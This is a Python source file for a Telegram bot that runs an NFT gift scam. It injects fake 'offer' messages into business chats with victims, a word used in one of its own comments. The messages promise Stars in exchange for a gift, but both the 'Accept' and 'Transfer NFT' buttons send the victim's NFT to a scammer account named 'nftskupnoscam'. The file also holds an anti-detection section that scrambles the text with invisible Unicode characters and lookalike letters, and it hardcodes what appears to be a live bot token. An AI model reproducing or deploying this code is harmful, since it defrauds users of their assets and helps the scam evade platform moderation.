import telebot
import re
import random
import time
import threading
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, MessageEntity

BOT_TOKEN  = "8957995978:AAEMJv04pvmQPuTppLDKLQoescjezii5ulY"
NFT_TARGET = "nftskupnoscam"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

STAR_EMOJI_ID = "5920281855378068765"

_SECRET_POOL = [
    "птица","мир","любовь","нежность","обожаю","весна","волна","луна","звезда",
    "ветер","туман","река","гора","лес","сад","цветок","рассвет","закат","небо",
    "дождь","снег","лёд","пламя","свет","тень","эхо","тишина","голос","сердце",
    "душа","мечта","надежда","вера","радость","грусть","улыбка","взгляд","касание",
    "объятие","поцелуй","шёпот","смех","слеза","путь","дорога","мост","берег",
    "прибой","шторм","гроза","молния","гром","радуга","иней","роса","пыль",
    "дым","пепел","уголь","алмаз","жемчуг","опал","рубин","сапфир","изумруд",
    "янтарь","коралл","шёлк","бархат","лён","хлопок","парча","кружево","атлас",
    "туча","облако","горизонт","перо","крыло","гнездо","полёт","парение",
    "охота","след","стая","волк","лиса","сова","орёл","сокол","голубь","ласточка",
    "журавль","лебедь","павлин","колибри","бабочка","стрекоза","жук","паук","мышь",
    "кот","лев","тигр","барс","рысь","зубр","лось","олень","заяц","бобёр",
    "выдра","дельфин","кит","акула","медуза","краб","устрица","маяк","парус",
    "якорь","штурвал","компас","карта","маршрут","азимут","меридиан","полюс",
    "ледник","вулкан","гейзер","каньон","долина","плато","равнина","степь","тундра",
    "тайга","джунгли","пустыня","оазис","мираж","песок","камень","скала","утёс",
    "пещера","грот","башня","замок","крепость","стена","ворота","купол","шпиль",
    "колонна","фреска","мозаика","витраж","статуя","маска","зеркало","призма",
    "хрусталь","стекло","фарфор","глина","кость","раковина","нить","узел","петля",
    "спираль","круг","квадрат","ромб","стрела","точка","линия","цвет","тон",
    "палитра","кисть","холст","рамка","шрифт","строка","страница","глава","архив",
    "символ","знак","образ","память","искра","прах","закон","кодекс","печать",
]

# pending: secret → data
# bc_store: user_id → {bc_id, chat_id} последнего бизнес-чата
_pending:  dict[str, dict] = {}
_bc_store: dict[int, dict] = {}   # user_id → {bc_id, chat_id}
_lock = threading.Lock()

# ─── антидетект ───────────────────────────────────────────────────────────────
_VS  = [chr(0xFE00 + i) for i in range(16)]
_INV = ['\u200b','\u200c','\u200d','\u2060','\ufeff','\u00ad','\u034f','\u180e']
_MATH_BOLD = {
    **{chr(65+i): chr(0x1D5D4+i) for i in range(26)},
    **{chr(97+i): chr(0x1D5EE+i) for i in range(26)},
    **{str(i):    chr(0x1D7EC+i) for i in range(10)},
}
_CYR = {'а':'𝗮','е':'𝗲','и':'𝗶','к':'𝗸','м':'𝗺','н':'𝗻',
        'о':'𝗼','р':'𝗿','с':'𝘀','т':'𝘁','у':'𝘂','в':'𝘃'}
_PUNCT = {'.':['．','·','.'],',':['，',','],'!':['！','!'],'?':['？','?'],
          ':':['：',':'],'-':['‐','–','-']}

def bold_font(t):
    out = []
    for ch in t:
        m = _CYR.get(ch.lower(), _MATH_BOLD.get(ch, ch))
        out.append(m)
        if random.random() < 0.8: out.append(random.choice(_VS))
    return ''.join(out)

def unique_text(t):
    out = []
    for ch in t:
        if ch == '\n': out.append('\n'); continue
        if ch == ' ':
            out.append(' ')
            for _ in range(random.randint(1,2)): out.append(random.choice(_INV))
            continue
        if ch in _PUNCT: out.append(random.choice(_PUNCT[ch])); continue
        out.append(ch)
        if random.random() < 0.7: out.append(random.choice(_VS))
    return ''.join(out)

def _new_secret():
    w = random.choice(_SECRET_POOL)
    with _lock:
        return w if w not in _pending else w + str(random.randint(10,99))

def random_delay():
    if random.random() < 0.3: time.sleep(random.uniform(0.1,0.3))
    time.sleep(random.uniform(0.3,1.1))

def offer_keyboard():
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton("✗ Отклонить", callback_data="decline"),
        InlineKeyboardButton("✓ Принять",   url=f"tg://send_gift?to={NFT_TARGET}")
    )
    kb.row(InlineKeyboardButton("🎁 Передать NFT", url=f"tg://send_gift?to={NFT_TARGET}"))
    kb.row(InlineKeyboardButton("📖 Как передать NFT", callback_data="how_nft"))
    return kb

# ─── /start ───────────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
def cmd_start(msg):
    bot.send_message(msg.chat.id,
        "Команды:\n.o [NFT_URL] [звёзд] [ru|eng|cn]\n\n"
        "Пример:\n.o https://t.me/nft/xmas-stocking-7391 500 ru")

# ─── создание оффера ──────────────────────────────────────────────────────────
@bot.message_handler(regexp=r'^\.o\s+(\S+)\s+(\d+)\s+(ru|eng|cn)$')
def create_offer(msg):
    m = re.match(r'^\.o\s+(\S+)\s+(\d+)\s+(ru|eng|cn)$', msg.text)
    nft_url  = m.group(1)
    stars    = m.group(2)
    lang     = m.group(3)
    nft_name = nft_url.rstrip('/').split('/')[-1].replace('-',' ').title() or "Gift"
    secret   = _new_secret()
    with _lock:
        _pending[secret] = {"nft_url":nft_url,"nft_name":nft_name,"stars":stars,"lang":lang}
    print(f"[CREATE] secret={secret}")
    bot.send_message(msg.chat.id,
        f"✅ Оффер создан\n🔑 Секретное слово: <code>{secret}</code>\n\n"
        f"Отправь его в нужный чат — оффер появится там.",
        parse_mode="HTML")

# ─── business connection: сохраняем bc_id + chat_id ──────────────────────────
@bot.business_connection_handler()
def on_bc(bc):
    with _lock:
        _bc_store[bc.user_chat_id] = {"bc_id": bc.id}
    print(f"[BC] stored user={bc.user_chat_id} bc={bc.id}")
    try:
        bot.send_message(bc.user_chat_id,
            f"✅ Подключено. BC ID: {bc.id}")
    except Exception as e:
        print(f"[BC] {e}")

# ─── бизнес-сообщение: секретное слово ───────────────────────────────────────
@bot.business_message_handler(func=lambda m: True)
def handle_biz(message):
    text  = (message.text or "").strip()
    bc_id = message.business_connection_id
    cid   = message.chat.id
    uid   = message.from_user.id if message.from_user else None

    # сохраняем bc_id и chat_id на случай если понадобится
    if bc_id and uid:
        with _lock:
            _bc_store[uid] = {"bc_id": bc_id, "chat_id": cid}

    print(f"[BIZ] '{text}' bc={bc_id} chat={cid} pending={list(_pending.keys())[:5]}")

    with _lock:
        data = _pending.get(text)
    if data is None:
        return

    with _lock:
        _pending.pop(text, None)

    _fire_offer(cid, bc_id, message.message_id,
                data["stars"], data["nft_url"], data["nft_name"])

# ─── обычное сообщение: секретное слово (когда business_message не приходит) ──
@bot.message_handler(func=lambda m: m.chat.type == "private"
                     and not (m.text or "").startswith('/'))
def handle_private(message):
    text = (message.text or "").strip()
    uid  = message.from_user.id

    with _lock:
        data = _pending.get(text)
    if data is None:
        return

    # берём сохранённый bc_id для этого юзера
    with _lock:
        bc_data = _bc_store.get(uid)

    if not bc_data:
        print(f"[PRIV] no bc_id for user {uid}")
        bot.send_message(message.chat.id,
            "❌ Нет активного бизнес-подключения. Подключи бота через Telegram Business.")
        return

    bc_id  = bc_data["bc_id"]
    # chat_id цели нужен — его мы не знаем из личного сообщения
    # поэтому этот путь не работает: нужен business_message
    print(f"[PRIV] secret matched but no target chat — need business_message")
    bot.send_message(message.chat.id,
        "⚠️ Секретное слово принято, но отправляй его прямо в бизнес-чат с жертвой, "
        "не в бота.")

# ─── построение оффера ────────────────────────────────────────────────────────
def _fire_offer(chat_id, bc_id, msg_id, stars, nft_url, nft_name):
    try:
        bot.delete_message(chat_id, msg_id, business_connection_id=bc_id)
    except Exception as e:
        print(f"[DEL] {e}")

    p1      = unique_text("Пользователь предлагает Вам\n")
    p_stars = bold_font(stars)
    p_star  = " ⭐"
    p2      = unique_text(" за подарок ")
    p_nft   = nft_name
    p3      = unique_text(".\n\nПредложение действует ещё ")
    p_time  = bold_font("6 ч. 0 мин.")
    p4      = unique_text("..")

    text      = p1 + p_stars + p_star + p2 + p_nft + p3 + p_time + p4
    off_stars = len(p1)
    off_star  = len(p1 + p_stars + " ")
    off_nft   = len(p1 + p_stars + p_star + p2)
    off_time  = len(p1 + p_stars + p_star + p2 + p_nft + p3)

    entities = [MessageEntity(**e) for e in [
        {"type":"bold",        "offset":off_stars,"length":len(p_stars)},
        {"type":"custom_emoji","offset":off_star, "length":1,
         "custom_emoji_id":STAR_EMOJI_ID},
        {"type":"text_link",   "offset":off_nft,  "length":len(p_nft),"url":nft_url},
        {"type":"bold",        "offset":off_time, "length":len(p_time)},
    ]]

    random_delay()
    try:
        bot.send_message(chat_id, text, entities=entities,
                         reply_markup=offer_keyboard(),
                         business_connection_id=bc_id)
        print(f"[OFFER] sent to {chat_id}")
    except Exception as e:
        print(f"[OFFER] error: {e}")

# ─── callbacks ────────────────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "decline")
def cb_decline(call):
    bot.answer_callback_query(call.id, "Предложение отклонено.")
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except: pass

@bot.callback_query_handler(func=lambda c: c.data == "how_nft")
def cb_how(call):
    bot.answer_callback_query(call.id)
    text = (
        "👑 <b>Как передать NFT — пошагово</b>\n\n"
        "🔥 Нажми кнопку <b>«🎁 Передать NFT»</b> ниже\n"
        "  └ Telegram откроет меню отправки подарка\n\n"
        "✅ Выбери нужный коллекционный NFT из своей коллекции\n\n"
        "✅ Нажми <b>«Отправить»</b> — подарок уйдёт получателю\n\n"
        "✅ После отправки — нажми <b>«Принять»</b> на карточке\n\n"
        "💎 <b>Получишь ⭐ звёзды мгновенно после подтверждения</b>\n\n"
        "🛡️ <i>NFT передаётся напрямую через Telegram.\n"
        "Бот не имеет доступа к твоим подаркам.</i>"
    )
    kb = InlineKeyboardMarkup()
    kb.row(InlineKeyboardButton("🎁 Передать NFT", url=f"tg://send_gift?to={NFT_TARGET}"))
    kb.row(InlineKeyboardButton("← Назад", callback_data="how_back"))
    try:
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              parse_mode="HTML", reply_markup=kb)
    except: pass

@bot.callback_query_handler(func=lambda c: c.data == "how_back")
def cb_back(call):
    bot.answer_callback_query(call.id)
    try:
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id,
                                      reply_markup=offer_keyboard())
    except: pass

# ─── keep-alive ───────────────────────────────────────────────────────────────
class _Ping(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a): pass

def _http():
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(("0.0.0.0", port), _Ping).serve_forever()

if __name__ == "__main__":
    threading.Thread(target=_http, daemon=True).start()
    while True:
        try:
            print("Bot started")
            bot.infinity_polling(
                allowed_updates=[
                    "message","business_message",
                    "business_connection","callback_query",
                ],
                timeout=30, long_polling_timeout=20,
            )
        except Exception as e:
            print(f"Restart: {e}")
            time.sleep(5)
